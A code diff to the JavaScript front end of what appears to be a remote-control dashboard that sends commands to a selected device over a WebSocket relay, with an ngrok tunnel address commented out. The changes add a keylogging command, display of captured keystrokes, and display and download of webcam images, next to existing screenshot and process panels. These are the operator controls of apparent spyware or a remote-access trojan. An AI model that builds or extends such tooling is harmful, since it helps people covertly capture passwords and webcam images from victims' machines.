@@ -1,4 +1,6 @@
 const ws = new WebSocket("ws://localhost:5000/ws");
+//const ws = new WebSocket('wss://abigail-conciliable-hyun.ngrok-free.dev/ws/');
+
 const clientName = "web-" + Math.floor(Math.random() * 1000);
 let selectedDevice = null;
 
@@ -101,6 +103,15 @@ function sendCommand(command) {
         }));
     }
 
+    else if (command === "keylog") {
+        ws.send(JSON.stringify({
+            type: "command",
+            from: clientName,
+            to: selectedDevice,
+            command: 'KEYLOG'
+        }));
+    }
+
     else {
         ws.send(JSON.stringify({
             type: "command",
@@ -121,7 +132,7 @@ function handleResponse(msg) {
 
     switch (activePanel.id) {
         case "keylog":
-            renderKeylogTab(data);
+            printKeys(msg.data);
             break;
 
         // case "shutdown":
@@ -134,6 +145,10 @@ function handleResponse(msg) {
 
         case "screenshot":
             displayScreenshot(msg.data);
+            break;
+
+        case "webcam":
+            displayWebcam(msg.data);
             break;
 
         case "process":
@@ -259,10 +274,31 @@ function displayScreenshot(img) {
     imgEle.style.scale = "0.9";
 }
 
+function displayWebcam(img) {
+    let imgEle = document.getElementById("webcam-screen");
+    imgEle.src = "data:image/jpeg;base64," + img;
+    imgEle.style.width = "80%";
+    imgEle.style.transformOrigin = "top left"; // This is likely what you meant
+    imgEle.style.scale = "0.9";
+}
+
+function printKeys(keys) {
+    let pEle = document.getElementById("keys-data");
+    pEle.textContent = keys;
+}
+
 document.getElementById("save-btn").addEventListener('click', () => {
     let imgEle = document.getElementById("monitor-screen");
     const link = document.createElement("a");
     link.download = `screenshot_${new Date().getTime()}.jpg`;
+    link.href = imgEle.src;
+    link.click();
+})
+
+document.getElementById("save-web-btn").addEventListener('click', () => {
+    let imgEle = document.getElementById("webcam-screen");
+    const link = document.createElement("a");
+    link.download = `webcam_${new Date().getTime()}.jpg`;
     link.href = imgEle.src;
     link.click();
 })
@@ -279,7 +315,7 @@ document.querySelectorAll(".tab").forEach(tab => {
         document.getElementById(target).classList.add("active");
 
         // send command based on tab
-        //sendCommand(target);
+        if (target === "keylog") sendCommand(target);
     };
 });
 
